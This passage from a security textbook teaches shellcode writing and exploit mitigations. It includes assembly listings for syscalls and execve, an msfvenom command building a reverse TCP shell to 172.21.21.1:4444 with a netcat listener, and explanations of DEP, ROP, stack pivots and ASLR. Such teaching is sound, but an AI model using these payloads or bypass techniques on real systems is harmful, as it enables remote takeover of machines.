On Unix-like systems, including Linux, there’s a set of defined error numbers (abbreviated
as errno). The error code is defined as positive in the system but returns as negative to
indicate that it’s an error condition. You can look up the error code in the system C header
files, but the short Python script in Listing 10-18 will do the work for us.
import os
||||||||||||||||||||
||||||||||||||||||||
# Specify the positive error number
err = 14
print os.errno.errorcode[err]
# Prints 'EFAULT'
print os.strerror(err)
# Prints 'Bad address'
Listing 10-18: A simple Python script to print error codes
Running the script will print the error code name as EFAULT and the string description as
Bad address. This error code indicates that the system call tried to access some memory that
was invalid, resulting in a memory fault. The only memory address we’re passing is the
pointer to the greeting. Let’s look at the disassembly to find out whether the pointer we’re
passing is at fault:
00000000  B801000000        mov rax,0x1
00000005  BF01000000        mov rdi,0x1
0000000A  488D34251A000000  lea rsi,[0x1a]
00000012  BA0C000000        mov rdx,0xc
00000017  0F05              syscall
00000019  C3                ret
0000001A  db "Hello User!", 10
Now we can see the problem with our code: the lea instruction, which loads the address
to the greeting, is loading the absolute address 0x1A. But if you look at the test harness
executions we’ve done so far, the address at which we load the executable code isn’t at
0x1A or anywhere close to it. This mismatch between the location where the shell code
loads and the absolute addresses causes a problem. We can’t always determine in advance
where the shell code will be loaded in memory, so we need a way of referencing the
greeting relative to the current executing location. Let’s look at how to do this on 32-bit
and 64-bit x86 processors.
Accessing the Relative Address on 32- and 64-Bit Systems
In 32-bit x86 mode, the simplest way of getting a relative address is to take advantage of
the fact that the call instruction works with relative addresses. When a call instruction
executes, it pushes the absolute address of the subsequent instruction onto the stack as a
return address. We can use this absolute return address value to calculate where the
current shell code is executing from and adjust the memory address of the greeting to
match. For example, replace the lea instruction in Listing 10-17 with the following code:
call _get_rip
_get_rip:
; Pop return address off the stack
pop rsi
; Add relative offset from return to greeting
add rsi, _greeting - _get_rip
Using a relative call works well, but it massively complicates the code. Fortunately, the
64-bit instruction set introduced relative data addressing. We can access this in nasm by
adding the rel keyword in front of an address. By changing the lea instruction as follows,
Technet24
||||||||||||||||||||
||||||||||||||||||||
we can access the address of the greeting relative to the current executing instruction:
lea rsi, [rel _greeting]
Now we can reassemble our shell code with these changes, and the message should
print successfully:
$ nasm -f bin -o shellcode.bin shellcode.asm
$ ./test_shellcode shellcode.bin
Mapped Address: 0x7f165dedf000
Hello User!
Shell Result: 12
Executing the Other Programs
Let’s wrap up our overview of system calls by executing another binary using the execve
system call. Executing another binary is a common technique for getting execution on a
target system that doesn’t require long, complicated shell code. The execve system call takes
three parameters: the path to the program to run, an array of command line arguments
with the array terminated by NULL, and an array of environment variables terminated by NULL.
Calling execve requires a bit more work than calling simple system calls, such as write,
because we need to build the arrays on the stack; however, it’s not that hard. Listing 10-19
executes the uname command by passing it the -a argument.
execve.asm
 BITS 64
 %define SYS_execve 59
 _start:
   mov rax, SYS_execve
 ; Load the executable path
➊ lea rdi, [rel _exec_path]
 ; Load the argument
   lea rsi, [rel _argument]
 ; Build argument array on stack = { _exec_path, _argument, NULL }
➋ push 0
   push rsi
   push rdi
➌ mov rsi, rsp
 ; Build environment array on stack = { NULL }
   push 0
➍ mov rdx, rsp
➎ syscall
 ; execve shouldn't return, but just in case
   ret
 _exec_path:
   db "/bin/uname", 0
 _argument:
   db "-a", 0
Listing 10-19: Executing an arbitrary executable in shell code
The shellcode in Listing 10-19 is complex, so let’s break it down step-by-step. First, the
||||||||||||||||||||
||||||||||||||||||||
addresses of two strings, "/bin/uname" and "-a", are loaded into registers ➊. The addresses of
the two strings with the final NUL (which is represented by a 0) are then pushed onto the
stack in reverse order ➋. The code copies the current address of the stack to the RSI
register, which is the second argument to the system call ➌. Next, a single NUL is pushed
on the stack for the environment array, and the address on the stack is copied to the RDX
register ➍, which is the third argument to the system call. The RDI register already
contains the address of the "/bin/uname" string so our shell code does not need to reload the
address before calling the system call. Finally, we execute the execve system call ➎, which
executes the shell equivalent of the following C code:
char* args[] = { "/bin/uname",  "-a", NULL };
char* envp[] = { NULL };
execve("/bin/uname", args, envp);
If you assemble the execve shell code, you should see output similar to the following,
where command line /bin/uname -a is executed:
$ nasm -f bin -o execve.bin execve.asm
$ ./test_shellcode execv.bin
Mapped Address: 0x7fbdc3c1e000
Linux foobar 4.4.0 Wed Dec 31 14:42:53 PST 2014 x86_64 x86_64 x86_64 GNU/Linux
Generating Shell Code with Metasploit
It’s worth practicing writing your own shell code to gain a deeper understanding of it.
However, because people have been writing shell code for a long time, a wide range of
shell code to use for different platforms and purposes is already available online.
The Metasploit project is one useful repository of shell code. Metasploit gives you the
option of generating shell code as a binary blob, which you can easily plug into your own
exploit. Using Metasploit has many advantages:
• Handling encoding of the shell code by removing banned characters or formatting to
avoid detection
• Supporting many different methods of gaining execution, including simple reverse shell
and executing new binaries
• Supporting multiple platforms (including Linux, Windows, and macOS) as well as
multiple architectures (such as x86, x64, and ARM)
I won’t explain in great detail how to build Metasploit modules or use their staged shell
code, which requires the use of the Metasploit console to interact with the target. Instead,
I’ll use a simple example of a reverse TCP shell to show you how to generate shell code
using Metasploit. (Recall that a reverse TCP shell allows the target machine to
communicate with the attacker’s machine via a listening port, which the attacker can use to
gain execution.)
Technet24
||||||||||||||||||||
||||||||||||||||||||
Accessing Metasploit Payloads
The msfvenom command line utility comes with a Metasploit installation, which provides
access to the various shell code payloads built into Metasploit. We can list the payloads
supported for x64 Linux using the -l option and filtering the output:
# msfvenom -l | grep linux/x64
--snip--
linux/x64/shell_bind_tcp    Listen for a connection and spawn a command shell
linux/x64/shell_reverse_tcp Connect back to attacker and spawn a command shell
We’ll use two shell codes:
shell_bind_tcp Binds to a TCP port and opens a local shell when connected to it
shell_reverse_tcp Attempts to connect back to your machine with a shell attached
Both of these payloads should work with a simple tool, such as Netcat, by either
connecting to the target system or listening on the local system.
Building a Reverse Shell
When generating the shell code, you must specify the listening port (for bind and reverse
shell) and the listening IP (for reverse shell, this is your machine’s IP address). These
options are specified by passing LPORT=port and LHOST=IP, respectively. We’ll use the following
code to build a reverse TCP shell, which will connect to the host 172.21.21.1 on TCP port
4444:
# msfvenom -p linux/x64/shell_reverse_tcp -f raw LHOST=172.21.21.1\
           LPORT=4444 > msf_shellcode.bin
The msfvenom tool outputs the shell code to standard output by default, so you’ll need to
pipe it to a file; otherwise, it will just print to the console and be lost. We also need to
specify the -f raw flag to output the shell code as a raw binary blob. There are other
potential options as well. For example, you can output the shell code to a small .elf
executable, which you can run directly for testing. Because we have a test harness, we
won’t need to do that.
Executing the Payload
To execute the payload, we need to set up a listening instance of netcat listening on port
4444 (for example, nc -l 4444). It’s possible that you won’t see a prompt when the
connection is made. However, typing the id command should echo back the result:
$ nc -l 4444
# Wait for connection
id
uid=1000(user) gid=1000(user) groups=1000(user)
||||||||||||||||||||
||||||||||||||||||||
The result shows that the shell successfully executed the id command on the system the
shell code is running on and printed the user and group IDs from the system. You can use
a similar payload on Windows, macOS, and even Solaris. It might be worthwhile to
explore the various options in msfvenom on your own.
Memory Corruption Exploit Mitigations
In “Exploiting Memory Corruption Vulnerabilities” on page 246, I alluded to exploit
mitigations and how they make exploiting memory vulnerabilities difficult. The truth is
that exploiting a memory corruption vulnerability on most modern platforms can be quite
complicated due to exploit mitigations added to the compilers (and the generated
application) as well as to the OS.
Security vulnerabilities seem to be an inevitable part of software development, as do
significant chunks of source code written in memory-unsafe languages that are not updated
for long periods of time. Therefore, it’s unlikely that memory corruption vulnerabilities
will disappear overnight.
Instead of trying to fix all these vulnerabilities, developers have implemented clever
techniques to mitigate the impact of known security weaknesses. Specifically, these
techniques aim to make exploitation of memory corruption vulnerabilities difficult or,
ideally, impossible. In this section, I’ll describe some of the exploit mitigation techniques
used in contemporary platforms and development tools that make it more difficult for
attackers to exploit these vulnerabilities.
Data Execution Prevention
As you saw earlier, one of the main aims when developing an exploit is to gain control of
the instruction pointer. In my previous explanation, I glossed over problems that might
occur when placing your shell code in memory and executing it. On modern platforms,
you’re unlikely to be able to execute arbitrary shell code as easily as described earlier due
to Data Execution Prevention (DEP) or No-Execute (NX) mitigation.
DEP attempts to mitigate memory corruption exploitation by requiring memory with
executable instructions to be specially allocated by the OS. This requires processor support
so that if the process tries to execute memory at an address that’s not marked as executable,
the processor raises an error. The OS then terminates the process in error to prevent
further execution.
The error resulting from executing nonexecutable memory can be hard to spot and
look confusing at first. Almost all platforms misreport the error as Segmentation fault or Access
violation on what looks like potentially legitimate code. You might mistake this error for
the instruction’s attempt to access invalid memory. Due to this confusion, you might spend
time debugging your code to figure out why your shell code isn’t executing correctly,
Technet24
||||||||||||||||||||
||||||||||||||||||||
believing it to be a bug in your code when it’s actually DEP being triggered. For example,
Listing 10-20 shows an example of a DEP crash.
GNU gdb 7.7.1
(gdb) r
Starting program: /home/user/triage/dep
Program received signal SIGSEGV, Segmentation fault.
0xbffff730 in ?? ()
(gdb) x/3i $pc
=> 0xbffff730:  push   $0x2a➊
   0xbffff732:  pop    %eax
   0xbffff733:  ret
Listing 10-20: An example crash from executing nonexecutable memory
It’s tricky to determine the source of this crash. At first glance, you might think it’s due
to an invalid stack pointer, because the push instruction at ➊ would result in the same
error. Only by looking at where the instruction is located can you discover it was executing
nonexecutable memory. You can determine whether it’s in executable memory by using
the memory map commands described in Table 10-8.
DEP is very effective in many cases at preventing easy exploitation of memory
corruption vulnerabilities, because it’s easy for a platform developer to limit executable
memory to specific executable modules, leaving areas like the heap or stack nonexecutable.
However, limiting executable memory in this way does require hardware and software
support, leaving software vulnerable due to human error. For example, when exploiting a
simple network-connected device, it might be that the developers haven’t bothered to
enable DEP or that the hardware they’re using doesn’t support it.
If DEP is enabled, you can use the return-oriented programming method as a
workaround.
Return-Oriented Programming Counter-Exploit
The development of the return-oriented programming (ROP) technique was in direct
response to the increase in platforms equipped with DEP. ROP is a simple technique that
repurposes existing, already executable instructions rather than injecting arbitrary
instructions into memory and executing them. Let’s look at a simple example of a stack
memory corruption exploit using this technique.
On Unix-like platforms, the C library, which provides the basic API for applications
such as opening files, also has functions that allow you to start a new process by passing the
command line in program code. The system() function is such a function and has the
following syntax:
int system(const char *command);
The function takes a simple command string, which represents the program to run and
||||||||||||||||||||
||||||||||||||||||||
the command line arguments. This command string is passed to the command interpreter,
which we’ll come back to later. For now, know that if you write the following in a C
application, it executes the ls application in the shell:
system("ls");
If we know the address of the system API in memory, we can redirect the instruction
pointer to the start of the API’s instructions; in addition, if we can influence the parameter
in memory, we can start a new process under our control. Calling the system API allows you
to bypass DEP because, as far as the processor and platform are concerned, you’re
executing legitimate instructions in memory marked as executable. Figure 10-8 shows this
process in more detail.
In this very simple visualization, ROP executes a function provided by the C library
(libc) to bypass DEP. This technique, specifically called Ret2Libc, laid the foundation of
ROP as we know it today. You can generalize this technique to write almost any program
using ROP, for example, to implement a full Turing complete system entirely by
manipulating the stack.
Figure 10-8: A simple ROP to call the system API
The key to understanding ROP is to know that a sequence of instructions doesn’t have
to execute as it was originally compiled into the program’s executable code. This means
you can take small snippets of code throughout the program or in other executable code,
such as libraries, and repurpose them to perform actions the developers didn’t originally
intend to execute. These small sequences of instructions that perform some useful function
are called ROP gadgets. Figure 10-9 shows a more complex ROP example that opens a file
and then writes a data buffer to the file.
Technet24
||||||||||||||||||||
||||||||||||||||||||
Figure 10-9: A more complex ROP calling open and then writing to the file by using a couple of gadgets
Because the value of the file descriptor returning from open probably can’t be known
ahead of time, this task would be more difficult to do using the simpler Ret2Libc
technique.
Populating the stack with the correct sequence of operations to execute as ROP is easy
if you have a stack buffer overflow. But what if you only have some other method of
gaining the initial code execution, such as a heap buffer overflow? In this case, you’ll need
a stack pivot, which is a ROP gadget that allows you to set the current stack pointer to a
known value. For example, if after the exploit EAX points to a memory buffer you control
(perhaps it’s a VTable pointer), you can gain control over the stack pointer and execute
your ROP chain using a gadget that looks like Listing 10-21.
xchg esp, eax # Exchange the EAX and ESP registers
ret           # Return, will execute address on new stack
Listing 10-21: Gaining execution using a ROP gadget
The gadget shown in Listing 10-21 switches the register value EAX with the value ESP,
which indexes the stack in memory. Because we control the value of EAX, we can pivot the
stack location to the set of operations (such as in Figure 10-9), which will execute our
ROP.
Unfortunately, using ROP to get around DEP is not without problems. Let’s look at
some ROP limitations and how to deal with them.
Address Space Layout Randomization (ASLR)
||||||||||||||||||||
||||||||||||||||||||
Using ROP to bypass DEP creates a couple of problems. First, you need to know the
location of the system functions or ROP gadgets you’re trying to execute. Second, you
need to know the location of the stack or other memory locations to use as data. However,
finding locations wasn’t always a limiting factor.
When DEP was first introduced into Windows XP SP2, all system binaries and the
main executable file were mapped in consistent locations, at least for a given update
revision and language. (This is why earlier Metasploit modules require you to specify a
language). In addition, the operation of the heap and the locations of thread stacks were
almost completely predictable. Therefore, on XP SP2 it was easy to circumvent DEP,
because you could guess the location of all the various components you might need to
execute your ROP chain.
Memory Information Disclosure Vulnerabilities
With the introduction of Address Space Layout Randomization (ASLR), bypassing DEP
became more difficult. As its name suggests, the goal of this mitigation method is to
randomize the layout of a process’s address space to make it harder for an attacker to
predict. Let’s look at a couple of ways that an exploit can bypass the protections provided
by ASLR.
Before ASLR, information disclosure vulnerabilities were typically useful for
circumventing an application’s security by allowing access to protected information in
memory, such as passwords. These types of vulnerabilities have found a new use: revealing
the layout of the address space to counter randomization by ASLR.
For this kind of exploit, you don’t always need to find a specific memory information
disclosure vulnerability; in some cases, you can create an information disclosure